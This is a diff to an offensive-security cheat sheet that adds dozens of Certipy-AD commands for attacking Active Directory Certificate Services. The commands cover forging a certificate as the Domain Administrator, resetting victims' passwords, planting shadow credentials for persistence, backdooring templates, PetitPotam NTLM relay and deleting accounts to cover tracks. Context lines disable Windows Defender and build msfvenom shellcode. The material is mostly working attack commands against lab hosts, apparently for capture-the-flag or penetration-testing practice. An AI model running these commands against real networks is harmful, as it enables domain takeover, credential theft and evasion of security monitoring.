@@ -1,8 +1,40 @@
 # CHEATSHEETS
 
+Certipy-AD
 
+certipy-ad find -u livestep -p 12345 -dc-ip 192.168.1.20 -target-ip 192.168.1.20 -vulnerable -enable -stdout	#Find certificate templates with misconfigurations
+certipy-ad account -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -user user_personification read	# enumerate and extract key attributes from the user_personification account
+certipy-ad account -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -user user_Victim -pass Password@12 update		# reset the password of the user_victim account
+certipy-ad account -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -user BADPC -pass Password@2 create		# creates a new machine account ESC8
+certipy-ad account -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -user BADPC delete		# ESC8 Delete machine account | Cover tracks
+certipy-ad req -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -ca ignite-DC01-CA -template ESC1 -upn 'administrator@ignite.local' -sid 'S-1-5-21-2876727035-1185539019-1507907093-500'	# request a cer�ficate as the Domain Administrator, embedding their UPN and SID
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.20		# authenticate using Kerberos PKINIT, bypassing the need for the actual administrator’s password
+certipy-ad account -u livestep -hashes 64fbae31cc352fc26af97cbdef151e03 -dc-ip 192.168.1.20 -user 'user_personification' read		#  authenticate and read the properties of the user_personification account (in this case, the Domain Administrator)
+certipy-ad shadow -u livestep -p 12345 -dc-ip 192.168.1.20 -account user_personification add		# persist access to the user_personification account (shivam) by injecting a shadow credential
+certipy-ad shadow -u livestep -p 12345 -dc-ip 192.168.1.20 -account user_victim list		# enumerate all shadow credentials associated with a specific user account
+certipy-ad shadow -u livestep -p 12345 -dc-ip 192.168.1.20 -account user_personification -device-id 528c42e7-1395-e86c-4b06-fffd9758fe6b info	# It reveals metadata such as the device ID, issuer, and timestamp of injection for the shadow credential | FORENSIC
+certipy-ad shadow -u livestep -p 12345 -dc-ip 192.168.1.20 -account user_personification -device-id 528c42e7-1395-e86c-4b06-fffd9758fe6b clear		# remove a specific shadow credential from a user account
+certipy-ad shadow -u livestep -p 12345 -dc-ip 192.168.1.20 -account user_personification auto		# automates the full stealth access lifecycle—adding, authenticating with, and then removing a shadow credential—all in a single step
+certipy-ad template -u livestep -p 12345 -dc-ip 192.168.1.20 -template ESC4 -save-configuration backup.json		# preserve the current configuration of a certificate template
+certipy-ad template -u livestep -p 12345 -dc-ip 192.168.1.20 -template ESC4 -write-default-configuration		# reset a certificate template (e.g., ESC4) to its default, potentially insecure state
+certipy-ad template -u livestep -p 12345 -dc-ip 192.168.1.20 -template ESC4 -write-configuration backup.json -no-save		# apply a previously saved and potentially backdoored configuration to a certificate template
+certipy-ad ca -u user_personification -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -list-template -ca ignite-DC01-CA		# list all certificate templates currently published and active on a specific CA
+certipy-ad ca -u user_personification -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -disable ESC1 -ca ignite-DC01-CA		# remove a vulnerable template
+certipy-ad ca -u user_personification -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -list-templates -ca ignite-DC01-CA	#  list all currently active templates
+certipy-ad ca -u user_personification -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -enable ESC1 -ca ignite-DC01-CA		# restore access to a previously disabled template
+certipy-ad ca -backup -u user_personification -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -ca ignite-DC01-CA		#  extract the complete configuration of a CA
+certipy-ad forge -ca-pfx ignite-DC01-CA.pfx -upn administrator@ignite.local		# create a Golden Certificate that impersonates the Domain Administrator—without relying on template permissions or domain policy
+certipy-ad req -u livestep -p 12345 -ca ignite-DC01-CA -target 192.168.1.20 -template SubCA -upn administrator@ignite.local -dc-ip 192.168.1.20		# exploits a vulnerable certificate template (e.g., SubCA) that allows Subordinate CA issuance
+certipy-ad ca -u livestep -p 12345 -ca ignite-DC01-CA -target 192.168.1.20 -issue-request 26 -dc-ip 192.168.1.20		# approve a pending SubCA certificate request (e.g., request ID 26)
+certipy-ad ca -ca ignite-DC01-CA -u livestep -p 12345 -dc-ip 192.168.1.20 -add-officer livestep		# grant a user full certificate management privileges—including the ability to approve requests and control templates
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.20		# authenticate directly to Active Directory
+certipy-ad relay -target 192.168.1.17 -template DomainController		# sets up a relay server to target the CA’s Web Enrollment endpoint using a template (e.g., DomainController) that auto-issues machine certificates
+python PetitPotam.py -u livestep -p 12345 192.168.1.12 192.168.1.14		# certipy-ad | force a Domain Controller to initiate an NTLM authentication to the attacker-controlled relay server | 192.168.1.12 is the target Domain Controller | 192.168.1.14 is the attacker’s relay server
+certipy-ad auth -pfx dc1.pfx -dc-ip 192.168.1.14 -ldap-shell		# After successfully relaying NTLM authentication and obtaining a valid Domain Controller certificate, the following command is used to authenticate as the DC via PKINIT and initiate an LDAP session | # Chanfge Password "change_password Administrator Qwer1234"
 certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Qwer1234' -dc-ip 10.129.255.131 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication'	# Certipy-AD ESC 15 - POLICIES
-certipy-ad auth -pfx administrator.pfx -domain tombwatcher.htb -dc-ip 10.129.255.131 -ldap-shell	# certipy-ad get ldap shell # Chanfge Password change_password Administrator Qwer1234
+certipy-ad shadow auto -username "Haze-IT-Backup$"@haze.htb -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target haze.htb -dc-ip 10.129.9.88		# instead pywhiskers
+certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound	# adcs | vulnerable templates
+
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Property * | Format-List Name,ObjectGUID,Deleted,DistinguishedName	# Deleted Objects - RecycleBin
 Restore-ADObject -Identity c1f1f0fe-df9c-494c-bf05-0679e181b358	# restore deleted objects | recyclebin
 
@@ -18,7 +50,6 @@ sudo sshuttle -r riley@10.10.110.35 192.168.110.0/24 -v		# Pivoting # SSH
 add-mppreference -ExclusionPath C:\temp		# Add an exclusion path # Defender
 set-mppreference -DisableRealTimeMonitoring $true		# Disable windows defender
 
-certipy-ad shadow auto -username "Haze-IT-Backup$"@haze.htb -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target haze.htb -dc-ip 10.129.9.88		# instead pywhiskers
 
 # BloodHound Ingestors
 ShatpHound.exe --outputdirectory C:\temp --ldapusername riley --ldappassword "password"		# bloodhound # ingest with sharphound
@@ -1582,7 +1613,6 @@ msfvenom -p windows/exec CMD=”cmd.exe /C your_command” -f c # CMD Windows Ex
 msfvenom -p windows/messagebox TEXT=”Message” -f c  # Windows Message Box Shellcode, malware
 targetedkerberoast.py --dc-ip IP -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 # ADCS ENUMERATION | CERTICATES
-certipy-ad find -u ca_svc -p 'Password@1' -target sequel.htb -text -stdout -vulnerable	# adcs enumeration | certificates
 netexec ldap domain.lab -u username -p password -M adcs 	# adcs enumeration | certificates
 ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName	# adcs enumeration | certificates
 certutil.exe -config - -ping	# adcs enumeration | certificates
@@ -1591,7 +1621,6 @@ certutil -dump	# adcs enumeration | certificates
 Certify.exe find /vulnerable	# adcs | vulnerable templates | enumeration
 Certify.exe find /vulnerable /currentuser	# # adcs | vulnerable templates | enumeration
 PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'	 # adcs | vulnerable templates | enumeration | ESC1
-certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound	# adcs | vulnerable templates | enumeration | ESC1
 python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'	# adcs | vulnerable templates | enumeration | ESC1
 Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
 certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
